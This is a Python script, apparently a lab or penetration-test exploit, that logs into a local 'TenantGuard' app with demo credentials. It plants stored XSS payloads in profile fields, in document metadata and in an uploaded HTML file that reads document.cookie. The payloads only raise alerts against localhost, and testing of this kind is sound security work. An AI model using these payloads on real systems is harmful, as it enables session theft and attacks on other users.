#!/usr/bin/env python3

import requests
import json
import os

BASE_URL = "http://localhost:5000"

def exploit_xss():
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    
    if login_response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = login_response.json().get('token')
    headers = {"Authorization": f"Bearer {token}"}
    
    print("[+] Testing XSS vulnerabilities...")
    
    # Test 1: Profile XSS via fullName field
    print("\n[1] Testing stored XSS in profile...")
    xss_payload_name = '<script>alert("XSS in Profile Name!")</script>'
    xss_payload_bio = '<img src=x onerror="alert(\'XSS in Bio!\')"/>'
    
    profile_data = {
        "fullName": xss_payload_name,
        "bio": xss_payload_bio
    }
    
    profile_response = requests.put(
        f"{BASE_URL}/api/profile",
        headers=headers,
        json=profile_data
    )
    
    if profile_response.status_code == 200:
        print("[!] XSS PAYLOAD STORED IN PROFILE")
        print(f"    Name payload: {xss_payload_name}")
        print(f"    Bio payload: {xss_payload_bio}")
    
    # Test 2: Document XSS via file upload
    print("\n[2] Testing XSS via document upload...")
    
    xss_content = '''<html>
<head><title>Malicious Document</title></head>
<body>
<h1>Normal Content</h1>
<script>
    alert('XSS Executed from Document!');
    console.log('Cookies:', document.cookie);
</script>
</body>
</html>'''
    
    with open('malicious.html', 'w') as f:
        f.write(xss_content)
    
    xss_title = '<script>alert("Document Title XSS!")</script>'
    xss_description = '<svg onload="alert(\'Description XSS!\')"/>'
    
    with open('malicious.html', 'rb') as f:
        files = {'file': ('malicious.html', f, 'text/html')}
        data = {
            'title': xss_title,
            'description': xss_description
        }
        
        upload_response = requests.post(
            f"{BASE_URL}/api/documents/upload",
            headers=headers,
            files=files,
            data=data
        )
    
    if upload_response.status_code == 201:
        document_id = upload_response.json().get('document', {}).get('_id')
        print("[!] MALICIOUS DOCUMENT UPLOADED")
        print(f"    Document ID: {document_id}")
        print(f"    Title XSS: {xss_title}")
        print(f"    Description XSS: {xss_description}")
    
    # Cleanup
    if os.path.exists('malicious.html'):
        os.remove('malicious.html')
    
    print("\n[+] XSS testing completed")
    print("[!] WARNING: Payloads are stored and will execute when viewed")
    
    return True

if __name__ == "__main__":
    exploit_xss()